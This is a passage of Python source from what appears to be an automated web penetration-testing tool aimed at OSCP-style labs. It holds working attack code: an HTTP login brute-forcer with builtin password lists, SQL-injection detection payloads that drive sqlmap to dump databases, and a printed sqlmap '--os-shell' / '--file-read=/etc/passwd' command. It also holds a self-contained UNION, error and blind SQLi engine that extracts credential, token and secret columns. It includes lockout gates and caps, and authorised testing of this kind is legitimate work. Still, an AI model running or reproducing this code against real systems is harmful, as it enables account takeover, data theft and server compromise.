        if inv1 and inv2 and adm and inv1[0] == inv2[0] and inv1[2] == inv2[2] and \
                abs(inv1[1] - inv2[1]) <= max(64, int(inv1[1] * 0.05)):
            why = None
            if adm[0] != inv1[0]:
                why = f"status {adm[0]} vs {inv1[0]}"
            elif adm[2] != inv1[2]:
                why = f"error '{adm[2]}' vs '{inv1[2]}'"
            elif abs(adm[1] - inv1[1]) > max(64, int(inv1[1] * 0.05)):
                why = f"length {adm[1]} vs ~{inv1[1]}"
            if why:
                found.append(f"  · ENUM {path}  ({why})")
        if found:
            with lock:
                results.setdefault(hostval, []).extend(found)

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path)
            finally:
                q.task_done()

    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_AUTHB_THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ auth bypass + user enumeration",
             f"login forms tested: {forms_tested[0]} · {reason}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            lines += sorted(set(results[hostval]))
    else:
        lines.append("\nno auth bypass / injection / user enumeration found")
    return "\n".join(lines)


_BRUTE_USER_WORDLISTS = [
    ("seclists top-usernames", ["/usr/share/seclists/Usernames/top-usernames-shortlist.txt"]),
    ("seclists names", ["/usr/share/seclists/Usernames/Names/names.txt"]),
]
_BRUTE_USER_BUILTIN = ["admin", "administrator", "root", "user", "test", "guest", "operator",
                       "manager", "support", "webadmin", "sysadmin", "tomcat", "oracle",
                       "postgres", "info", "demo", "staff", "service", "backup"]
_BRUTE_PASS_WORDLISTS = [
    ("seclists top-500",
     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt"]),
    ("seclists top-100",
     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"]),
    ("seclists probable-1575", ["/usr/share/seclists/Passwords/probable-v2-top-1575.txt"]),
    ("rockyou", ["/usr/share/wordlists/rockyou.txt"]),
]
_BRUTE_PASS_BUILTIN = [
    "password", "123456", "123456789", "12345678", "12345", "1234", "admin", "Password1",
    "P@ssw0rd", "password1", "welcome", "welcome1", "changeme", "letmein", "qwerty", "root",
    "toor", "abc123", "admin123", "password123", "iloveyou", "monkey", "dragon", "111111",
    "sunshine", "princess", "football", "secret", "master", "superman", "hello", "login",
    "passw0rd", "test", "guest", "default", "administrator", "qwerty123", "1q2w3e4r",
    "654321", "123321", "000000", "qazwsx", "trustno1", "1234567", "zaq12wsx", "pass",
]
_BRUTE_LOCKOUT_RE = re.compile(
    r"locked|too many|try again later|temporarily (?:disabled|blocked)|rate.?limit|"
    r"account.*(?:disabled|suspended|blocked)|exceeded|throttl", re.I)
_BRUTE_DEADLINE = 600
_BRUTE_THREADS = 4
_BRUTE_REQ_TIMEOUT = 5
_BRUTE_MAX_PASS = 200
_BRUTE_PER_USER_CAP = 100
_BRUTE_USER_ENUM_CAP = 40
_BRUTE_LOCKOUT_PROBE = 5
_BRUTE_MAX_TARGETS = 8


def _pick_wordlist(cascade: list, builtin_desc: str, builtin: list) -> tuple:
    """Generic first-available (multi-file merged) wordlist picker with a builtin fallback."""
    for label, paths in cascade:
        merged, seen = [], set()
        for path in paths:
            if not os.path.exists(path):
                continue
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    for ln in fh:
                        w = ln.strip()
                        if w and not w.startswith("#") and w not in seen:
                            seen.add(w)
                            merged.append(w)
            except OSError:
                continue
        if merged:
            return f"{label} ({', '.join(paths)})", merged
    return builtin_desc, list(builtin)


def _brute_enum_confirmed(ip: str, port: int, proto: str) -> set:
    """(hostval, path) login surfaces where step 13 confirmed username enumeration works."""
    s = set()
    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "auth-bypass":
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                me = re.search(r"ENUM (\S+)", ln)
                if me:
                    s.add((host, me.group(1)))
    return s


def _tool_login_brute(ip: str, port: int, proto: str) -> str:
    """HTTP step-14 tool: GATED login brute-force on Basic realms and HTML forms. Three gates
    run first: (1) build a user list — enumerated via step-13's oracle where confirmed, else a
    small unconfirmed shortlist; (2) a lockout probe (several wrong passwords) that ABORTS the
    brute for a target if the account locks / rate-limits; (3) only then a capped, low-rate
    password brute (per-user cap as a second guard). Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import base64
    import random
    import string
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_BRUTE_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_BRUTE_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(65536).decode("utf-8", "replace")
            return resp.status, data, (resp.headers.get_all("Set-Cookie") or []), \
                resp.headers.get("Location"), (resp.headers.get("WWW-Authenticate", "") or "")
        except Exception:                                     # noqa: BLE001
            return None, None, [], None, ""
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot brute")

    def _submit_form(hostval, path, u, p):
        g = _req(hostval, "GET", path)
        if g[0] is None:
            return None
        form = _parse_login_form(g[1] or "", path)
        if not form:
            return None
        data = dict(form["hidden"])
        data[form["user"]] = u
        data[form["pass"]] = p
        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
        pr = urllib.parse.urlparse(action)
        apath = pr.path + (f"?{pr.query}" if pr.query else "")
        cookie = "; ".join(c.split(";")[0] for c in g[2])
        extra = {"Content-Type": "application/x-www-form-urlencoded"}
        if cookie:
            extra["Cookie"] = cookie
        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)

    def _try_basic(hostval, path, u, p):
        tok = base64.b64encode(f"{u}:{p}".encode()).decode()
        return _req(hostval, "GET", path, extra={"Authorization": "Basic " + tok})

    def _attempt(authtype, hostval, path, u, p):
        return _try_basic(hostval, path, u, p) if authtype == "Basic" else _submit_form(hostval, path, u, p)

    def _names(setc):
        return {c.split("=", 1)[0].strip() for c in setc}

    def _success(authtype, cur, base):
        if cur is None:
            return False
        st = cur[0]
        if authtype == "Basic":
            return st is not None and st != 401
        if base is None:
            return False
        _st, body, sc, loc, _w = cur
        fbody, fsc = base[1], base[2]
        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
            return True
        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
            return True
        if bool(_CREDS_ERR_RE.search(fbody or "")) and not bool(_CREDS_ERR_RE.search(body or "")):
            return True
        new = _names(sc) - _names(fsc)
        if new and not _CREDS_ERR_RE.search(body or "") and \
                any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
            return True
        return False

    def _sig(r):
        if r is None:
            return None
        st, body = r[0], r[1]
        em = _CREDS_ERR_RE.search(body or "")
        return st, len(body or ""), (em.group(0).lower() if em else None)

    def _differs(a, b):
        if a[0] != b[0] or a[2] != b[2]:
            return True
        return abs(a[1] - b[1]) > max(64, int(b[1] * 0.05))

    def _rnduser():
        return "nx" + "".join(random.choices(string.ascii_lowercase, k=9))

    _ulabel, user_wl = _pick_wordlist(_BRUTE_USER_WORDLISTS, f"builtin ({len(_BRUTE_USER_BUILTIN)})",
                                      _BRUTE_USER_BUILTIN)
    plabel, pass_wl = _pick_wordlist(_BRUTE_PASS_WORDLISTS, f"builtin ({len(_BRUTE_PASS_BUILTIN)})",
                                     _BRUTE_PASS_BUILTIN)
    pass_wl = pass_wl[:_BRUTE_MAX_PASS]
    enum_ok = _brute_enum_confirmed(ip, port, proto)
    targets = _gather_login_targets(ip, port, proto)[:_BRUTE_MAX_TARGETS]

    deadline = time.time() + _BRUTE_DEADLINE
    stopped_deadline = [False]
    attempts = [0]
    a_lock = threading.Lock()
    results = {}
    r_lock = threading.Lock()

    def _bump(n=1):
        with a_lock:
            attempts[0] += n

    def _handle(hostval, path):
        if time.time() >= deadline:
            stopped_deadline[0] = True
            return
        g = _req(hostval, "GET", path)
        if g[0] is None:
            return
        if g[0] == 401 and "basic" in g[4].lower():
            authtype = "Basic"
        elif g[0] == 200 and _parse_login_form(g[1] or "", path):
            authtype = "form"
        else:
            return
        out = []

        # failure baseline (for form success detection) + invalid enum signature
        wrongpw = "Wp_" + "".join(random.choices(string.ascii_letters, k=9))
        fbase = _attempt(authtype, hostval, path, _rnduser(), wrongpw)
        _bump()

        # ── gate 1: user list ──────────────────────────────────────────────
        users, ulabel = [], "unconfirmed shortlist"
        if authtype == "form" and (hostval, path) in enum_ok:
            inv_sig = _sig(fbase)
            for cand in user_wl[:_BRUTE_USER_ENUM_CAP]:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    break
                s = _sig(_attempt(authtype, hostval, path, cand, wrongpw))
                _bump()
                if s and inv_sig and _differs(s, inv_sig):
                    users.append(cand)
                if len(users) >= 10:
                    break
            if users:
                ulabel = "enum-confirmed"
        if not users:
            users = ["admin", "administrator", "root", "user"]
        out.append(f"  users ({ulabel}): {', '.join(users)}")

        # ── gate 2: lockout probe ──────────────────────────────────────────
        probe_user = users[0]
        locked = False
        for _ in range(_BRUTE_LOCKOUT_PROBE):
            if time.time() >= deadline:
                stopped_deadline[0] = True
                break
            r = _attempt(authtype, hostval, path, probe_user,
                         "wx" + "".join(random.choices(string.ascii_letters, k=8)))
            _bump()
            if r and (r[0] == 429 or _BRUTE_LOCKOUT_RE.search(r[1] or "")):
                locked = True
                break
        if locked:
            out.append(f"  ⚠ LOCKOUT {path} — brute skipped (gate)")
            with r_lock:
                results.setdefault(hostval, []).extend(out)
            return

        # ── gate 3: capped, low-rate password brute ────────────────────────
        for u in users:
            if time.time() >= deadline:
                stopped_deadline[0] = True
                break
            cracked = None
            for i, pw in enumerate(pass_wl):
                if i >= _BRUTE_PER_USER_CAP or time.time() >= deadline:
                    if time.time() >= deadline:
                        stopped_deadline[0] = True
                    break
                cur = _attempt(authtype, hostval, path, u, pw)
                _bump()
                if cur and cur[0] == 429:        # rate-limited mid-brute → stop this user
                    break
                if _success(authtype, cur, fbase):
                    cracked = pw
                    break
            if cracked is not None:
                out.append(f"  ✗ CRACKED {u}:{cracked or '<blank>'} @ {path} ({authtype})")
        with r_lock:
            results.setdefault(hostval, []).extend(out)

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _handle(hostval, path)
            finally:
                q.task_done()

    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_BRUTE_THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ targeted login brute-force",
             f"password list: {plabel} (capped {len(pass_wl)}) · attempts {attempts[0]} · {reason}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            lines += results[hostval]
    else:
        lines.append("\nno login surfaces to brute")
    if not any("CRACKED" in ln for grp in results.values() for ln in grp):
        lines.append("\n(no credentials brute-forced)")
    return "\n".join(lines)


# non-destructive SQLi detection payloads (SELECT/AND/SLEEP only — never DROP/DELETE/UPDATE)
_SQLI_ERR_PAYLOADS = ["'", "\"", "')", "\\"]
_SQLI_DBMS_SIG = [
    ("mysql", r"you have an error in your sql syntax|warning:\s*mysqli?_|MySQL server version|valid MySQL"),
    ("postgresql", r"PostgreSQL.*?ERROR|pg_query|unterminated quoted string"),
    ("mssql", r"SQL Server|System\.Data\.SqlClient|unclosed quotation mark|ODBC SQL Server"),
    ("oracle", r"ORA-\d{5}|quoted string not properly terminated"),
    ("sqlite", r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|syntax error"),
]
_SQLI_BOOL = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1", " AND 1=2"),
    (" AND 1=1-- -", " AND 1=2-- -"),
]
_SQLI_TIME = [   # (dbms, sleep-5 template, control template)
    ("mysql", "' AND SLEEP({n})-- -", "' AND SLEEP(0)-- -"),
    ("mysql", '" AND SLEEP({n})-- -', '" AND SLEEP(0)-- -'),
    ("mysql", " AND SLEEP({n})", " AND SLEEP(0)"),
    ("postgresql", "' AND {n}=(SELECT {n} FROM PG_SLEEP({n}))-- -", "' AND 0=(SELECT 0)-- -"),
    ("mssql", "'; WAITFOR DELAY '0:0:{n}'-- -", "'; WAITFOR DELAY '0:0:0'-- -"),
]
_SQLI_DEADLINE = 300
_SQLI_THREADS = 6
_SQLI_REQ_TIMEOUT = 10
_SQLI_TIME_DELAY = 5
_SQLI_MAX_PARAMS = 30
_SQLI_MAX_TIME_PARAMS = 12
_SQLI_MAX_SQLMAP = 3
_SQLI_SQLMAP_TIMEOUT = 180


def _gather_sqli_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path, param) to test — the params step 11 confirmed, else common params on
    dynamic endpoints mined earlier."""
    tg, seen = [], set()

    def _add(host, path, param):
        if (host, path, param) not in seen:
            seen.add((host, path, param))
            tg.append((host, path, param))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "param-hunt":
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mm = re.match(r"\s+(\S+?)\?\[([^\]]+)\]", ln)
                if mm:
                    for p in mm.group(2).split(","):
                        if p.strip():
                            _add(host, mm.group(1), p.strip())
    if not tg:
        for host, path in _gather_param_endpoints(ip, port, proto):
            for p in ("id", "page", "cat", "file", "q", "user", "item", "pid", "view"):
                _add(host, path, p)
    return tg[:_SQLI_MAX_PARAMS]


def _tool_sqli_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step-15 tool: detect SQLi on discovered params (error / boolean-blind / time-blind,
    stdlib, non-destructive) and then run sqlmap --batch on the confirmed points for enumeration
    + a BOUNDED dump (current DB, capped rows). os-shell / file-read are NOT auto — a ready
    command is printed instead. Stdlib detection; a dead server raises."""
    import http.client
    import ssl
    import time
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        t0 = time.perf_counter()
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_SQLI_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_SQLI_REQ_TIMEOUT)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            body = resp.read(65536).decode("utf-8", "replace")
            return resp.status, body, time.perf_counter() - t0
        except Exception:                                     # noqa: BLE001
            return None, None, time.perf_counter() - t0
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test SQLi")

    targets = _gather_sqli_targets(ip, port, proto)
    deadline = time.time() + _SQLI_DEADLINE
    stopped = [False]
    confirmed = []            # (host, path, param, [techniques], dbms|None)
    time_candidates = []
    lock = threading.Lock()

    def _detect_fast(host, path, param):
        if time.time() >= deadline:
            stopped[0] = True
            return
        b_st, b_body, _ = _probe(host, path, param, "1")
        if b_st is None:
            return
        b_len = len(b_body or "")
        techs, dbms = [], None
        # error-based
        for pl in _SQLI_ERR_PAYLOADS:
            st, body, _ = _probe(host, path, param, "1" + pl)
            if body and _SQL_ERROR_RE.search(body):
                techs.append("error")
                for nm, rx in _SQLI_DBMS_SIG:
                    if re.search(rx, body, re.I):
                        dbms = nm
                        break
                break
        # boolean-blind
        for tpl, fpl in _SQLI_BOOL:
            rt = _probe(host, path, param, "1" + tpl)
            rf = _probe(host, path, param, "1" + fpl)
            if rt[0] and rf[0] and not _SQL_ERROR_RE.search(rt[1] or "") and \
                    not _SQL_ERROR_RE.search(rf[1] or ""):
                lt, lf = len(rt[1] or ""), len(rf[1] or "")
                if abs(lt - b_len) <= max(48, int(b_len * 0.02)) and \
                        abs(lt - lf) > max(80, int(lt * 0.05)):
                    techs.append("boolean")
                    break
        if techs:
            with lock:
                confirmed.append([host, path, param, techs, dbms])
        else:
            with lock:
                time_candidates.append((host, path, param))

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                host, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _detect_fast(host, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_SQLI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    # time-based: sequential (timing-sensitive), capped, only on not-yet-confirmed params
    for host, path, param in time_candidates[:_SQLI_MAX_TIME_PARAMS]:
        if time.time() >= deadline:
            stopped[0] = True
            break
        lat = min(_probe(host, path, param, "1")[2], _probe(host, path, param, "1")[2])
        for nm, ttpl, ctpl in _SQLI_TIME:
            _s, _b, c_el = _probe(host, path, param, "1" + ctpl)
            _s, _b, t_el = _probe(host, path, param, "1" + ttpl.format(n=_SQLI_TIME_DELAY))
            if t_el >= _SQLI_TIME_DELAY * 0.7 and (t_el - max(lat, c_el)) >= _SQLI_TIME_DELAY * 0.6:
                _s, _b, t2 = _probe(host, path, param, "1" + ttpl.format(n=_SQLI_TIME_DELAY))
                if t2 >= _SQLI_TIME_DELAY * 0.7:
                    confirmed.append([host, path, param, ["time"], nm])
                    break

    # sqlmap: enumerate + bounded dump on the confirmed points (capped)
    exe = shutil.which("sqlmap")
    sqlmap_out = {}
    for pt in confirmed[:_SQLI_MAX_SQLMAP]:
        host, path, param, _techs, dbms = pt
        url = f"{scheme}://{ip}:{port}{path}?{param}=1"
        if not exe:
            continue
        cmd = [exe, "-u", url, "-p", param, "--batch", "--level", "3", "--risk", "2",
               "--banner", "--current-user", "--current-db", "--dbs", "--tables", "--dump",
               "--start", "1", "--stop", "20", "--time-sec", str(_SQLI_TIME_DELAY),
               "--threads", "4", "--flush-session", "--disable-coloring"]
        if dbms:
            cmd += ["--dbms", dbms]
        if host != ip:
            cmd += ["--headers", f"Host: {host}"]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=_SQLI_SQLMAP_TIMEOUT)
            sqlmap_out[(host, path, param)] = proc.stdout or proc.stderr or ""
        except subprocess.TimeoutExpired:
            sqlmap_out[(host, path, param)] = "__timeout__"

    def _sqlmap_summary(out):
        if out == "__timeout__":
            return ["sqlmap: timed out (partial)"]
        if not out:
            return []
        s = []
        for label, rx in (("dbms", r"back-end DBMS:\s*(.+)"),
                          ("user", r"current user:\s*'([^']+)'"),
                          ("db", r"current database:\s*'([^']+)'")):
            m = re.search(rx, out)
            if m:
                s.append(f"{label}: {m.group(1).strip()}")
        mdb = re.search(r"available databases \[\d+\]:\n((?:\s*\[\*\] \S+\n?)+)", out)
        if mdb:
            dbs = re.findall(r"\[\*\] (\S+)", mdb.group(1))
            s.append(f"dbs: {', '.join(dbs[:8])}")
        if re.search(r"\[INFO\] table '.*?' dumped|Database:.*?\n\s*Table:", out) or \
                re.search(r"^\|.*\|$", out, re.M):
            s.append("dumped: yes")
        return s

    lines = [f"{scheme}://{ip}:{port}/ SQLi scan (stdlib detect + sqlmap)",
             f"params tested: {len(targets)} · injectable {len(confirmed)} · "
             f"sqlmap: {'ran' if exe else 'NOT INSTALLED — commands below'} · "
             f"{'deadline' if stopped[0] else 'complete'}"]
    if confirmed:
        by_host = {}
        for host, path, param, techs, dbms in confirmed:
            by_host.setdefault(host, []).append((path, param, techs, dbms))
        for host in sorted(by_host):
            lines.append(f"\n[{host}{' [default]' if host == ip else ''}]")
            for path, param, techs, dbms in by_host[host]:
                tag = ", ".join(techs) + (f"; {dbms}" if dbms else "")
                lines.append(f"  ✗ SQLI {path}?{param}  ({tag})")
                for s in _sqlmap_summary(sqlmap_out.get((host, path, param), "")):
                    lines.append(f"      {s}")
                url = f"{scheme}://{ip}:{port}{path}?{param}=1"
                hh = f" --headers='Host: {host}'" if host != ip else ""
                lines.append(f"      RCE/file (manual): sqlmap -u '{url}'{hh} -p {param} "
                             f"--batch --os-shell   # or --file-read=/etc/passwd")
    else:
        lines.append("\nno SQL injection found")
    return "\n".join(lines)


# OSCP-safe SQLi engine (no sqlmap / no external tool): breakout contexts, MySQL-first.
_SQLI_CTX = [("num", "1 "), ("sq", "1' "), ("dq", '1" '), ("sqp", "1') "), ("dqp", '1") ')]
_SQLI_DUMP_ERR = re.compile(
    r"SQL syntax|Unknown column|mysql_|valid MySQL|ORA-\d{5}|PostgreSQL|SQL Server|"
    r"sqlite|Warning|error in your|supplied argument|Query failed", re.I)
_SQLI_INTERESTING_TBL = re.compile(
    r"user|admin|account|member|login|credential|pass|auth|customer|staff|employee|flag|"
    r"secret|config|setting|session|token|key|private|cred", re.I)
_SQLI_INTERESTING_COL = re.compile(
    r"user|name|email|login|pass|pwd|hash|secret|token|key|role|admin|flag", re.I)
_SQLI_DUMP_MAX_TARGETS = 8
_SQLI_DUMP_MAX_COLS = 12
_SQLI_DUMP_ROWS = 15
_SQLI_DUMP_TABLES = 6
_SQLI_DUMP_DEADLINE = 300
_SQLI_DUMP_BLIND_MAXLEN = 64


def _tool_sqli_dump(ip: str, port: int, proto: str) -> str:
    """HTTP step tool (OSCP-safe, NO sqlmap / no external tool): a stdlib SQLi extraction
    engine. Finds the injection context, then extracts real data — UNION-based (fast: version,
    user, db, tables, columns, bounded row dump), error-based (extractvalue windows) or, for
    short scalars only, boolean-blind (binary search). MySQL-first. Non-destructive; dead → raises."""
    import http.client
    import ssl
    import time
    import urllib.parse
    import random
    import string

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    deadline = time.time() + _SQLI_DUMP_DEADLINE

    def _hx(s):
        return "0x" + s.encode().hex()

    def _get(hostval, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=10, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=10)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(200000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    def _engine(hostval, path, param):
        def g(v):
            return _get(hostval, path, param, v)

        base_st, base_body = g("1")
        if base_st is None:
            return None
        base_len = len(base_body or "")

        def broken(body, st):
            return (st is not None and st >= 500) or bool(_SQLI_DUMP_ERR.search(body or "")) or \
                abs(len(body or "") - base_len) > max(200, int(base_len * 0.5))

        # ── try UNION primitive across contexts ────────────────────────────
        mark = "".join(random.choices(string.ascii_lowercase, k=6))
        for cname, pre in _SQLI_CTX:
            if time.time() >= deadline:
                return None
            r1 = g(pre + "ORDER BY 1-- -")
            if r1[0] is None or broken(r1[1], r1[0]):
                continue
            cols = 1
            for n in range(2, _SQLI_DUMP_MAX_COLS + 1):
                rn = g(pre + f"ORDER BY {n}-- -")
                if broken(rn[1], rn[0]):
                    break
                cols = n
            slots = [_hx(f"{mark}{j}{mark}") for j in range(cols)]
            ru = g(pre + "UNION SELECT " + ",".join(slots) + "-- -")
            refl = None
            for j in range(cols):
                if f"{mark}{j}{mark}" in (ru[1] or ""):
                    refl = j
                    break
            if refl is None:
                continue

            def ux(expr):
                sl = ["NULL"] * cols
                sl[refl] = f"concat({_hx(mark)},({expr}),{_hx(mark)})"
                r = g(pre + "UNION SELECT " + ",".join(sl) + "-- -")
                m = re.search(re.escape(mark) + r"(.*?)" + re.escape(mark), r[1] or "", re.S)
                return m.group(1) if m else None

            return _harvest("UNION", cname, cols, refl, ux)

        # ── error-based primitive (MySQL extractvalue) ─────────────────────
        for cname, pre in _SQLI_CTX:
            if time.time() >= deadline:
                return None
            probe = g(pre + "AND extractvalue(1,concat(0x7e,0x6b716b))-- -")
            if probe[0] and re.search(r"XPATH syntax error: '~?kqk", probe[1] or ""):
                def ex(expr):
                    out, off = "", 1
                    while off < 512 and time.time() < deadline:
                        r = g(pre + f"AND extractvalue(1,concat(0x7e,mid(({expr}),{off},31)))-- -")
                        m = re.search(r"XPATH syntax error: '~(.*?)'", r[1] or "")
                        chunk = m.group(1) if m else ""
                        if not chunk:
                            break
                        out += chunk
                        if len(chunk) < 31:
                            break
                        off += 31
                    return out or None
                return _harvest("error", cname, None, None, ex)

        # ── boolean-blind primitive (scalars only) ─────────────────────────
        for cname, pre in _SQLI_CTX:
            if time.time() >= deadline:
                return None
            tr = g(pre + "AND 1=1-- -")
            fa = g(pre + "AND 1=2-- -")
            if not (tr[0] and fa[0]):
                continue
            lt, lf = len(tr[1] or ""), len(fa[1] or "")
            if abs(lt - base_len) <= max(48, int(base_len * 0.02)) and abs(lt - lf) > max(64, int(lt * 0.05)):
                def is_true(cond):
                    r = g(pre + f"AND ({cond})-- -")
                    return r[0] is not None and abs(len(r[1] or "") - lt) <= max(48, int(lt * 0.02))

                def bx(expr, maxlen=_SQLI_DUMP_BLIND_MAXLEN):
                    L = 0
                    for n in range(1, maxlen + 1):
                        if time.time() >= deadline:
                            break
                        if is_true(f"length(({expr}))>={n}"):
                            L = n
                        else:
                            break
                    s = ""
                    for i in range(1, L + 1):
                        if time.time() >= deadline:
                            break
                        lo, hi = 32, 126
                        while lo < hi:
                            md = (lo + hi) // 2
                            if is_true(f"ascii(substring(({expr}),{i},1))>{md}"):
                                lo = md + 1
                            else:
                                hi = md
                        s += chr(lo)
                    return s or None
                return _harvest("boolean", cname, None, None, bx, scalars_only=True)
        return None

    def _harvest(technique, cname, cols, refl, xf, scalars_only=False):
        info = {"technique": technique, "ctx": cname, "cols": cols, "refl": refl, "rows": []}
        info["version"] = xf("@@version")
        info["user"] = xf("current_user()")
        info["db"] = xf("database()")
        if scalars_only:
            return info
        tbls = xf("(SELECT group_concat(table_name SEPARATOR 0x2c) FROM "
                  "information_schema.tables WHERE table_schema=database())")
        tables = [t for t in (tbls or "").split(",") if t][:40]
        info["tables"] = tables
        pick = [t for t in tables if _SQLI_INTERESTING_TBL.search(t)] or tables
        for tname in pick[:_SQLI_DUMP_TABLES]:
            if time.time() >= deadline:
                break
            cnames = xf("(SELECT group_concat(column_name SEPARATOR 0x2c) FROM "
                        f"information_schema.columns WHERE table_schema=database() AND table_name={_hx(tname)})")
            columns = [c for c in (cnames or "").split(",") if c]
            if not columns:
                continue
            want = [c for c in columns if _SQLI_INTERESTING_COL.search(c)] or columns[:3]
            want = want[:4]
            expr = ("(SELECT group_concat(concat_ws(0x7c," + ",".join(want) +
                    f") SEPARATOR 0x0a) FROM {tname} LIMIT {_SQLI_DUMP_ROWS})")
            rows = xf(expr)
            info["rows"].append((tname, want, [r for r in (rows or "").split("\n") if r]))
        return info

    targets = _gather_sqli_targets(ip, port, proto)[:_SQLI_DUMP_MAX_TARGETS]
    if _get(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot dump")

    results = {}
    for hostval, path, param in targets:
        if time.time() >= deadline:
            break
        info = _engine(hostval, path, param)
        if info:
            results.setdefault(hostval, []).append((path, param, info))

    lines = [f"{scheme}://{ip}:{port}/ SQLi auto-dump (OSCP-safe, no sqlmap)",
             f"targets: {len(targets)} · extracted {sum(len(v) for v in results.values())} · "
             f"{'deadline' if time.time() >= deadline else 'complete'}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path, param, info in results[hostval]:
                tag = info["technique"] + (f", {info['cols']} cols, col#{info['refl'] + 1}"
                                           if info["cols"] else "")
                lines.append(f"  ✗ {path}?{param}  ({tag})")
                if info.get("version"):
                    lines.append(f"      version: {info['version']}")
                idl = " · ".join(x for x in (f"user: {info['user']}" if info.get("user") else "",
                                             f"db: {info['db']}" if info.get("db") else "") if x)
                if idl:
                    lines.append(f"      {idl}")
                if info.get("tables"):
                    lines.append(f"      tables: {', '.join(info['tables'][:15])}")
                for tname, cols_, rows in info.get("rows", []):
                    lines.append(f"      {tname} ({','.join(cols_)}):")
                    lines += [f"        {r}" for r in rows[:_SQLI_DUMP_ROWS]]
    else:
        lines.append("\nno SQL injection extracted")
    return "\n".join(lines)


# LFI / path traversal — file-like param names, read-only payloads, content-verified.
_LFI_FILE_PARAM = re.compile(
    r"file|page|path|include|inc|template|tpl|doc|document|view|lang|dir|load|read|"
    r"download|content|src|url|cat", re.I)
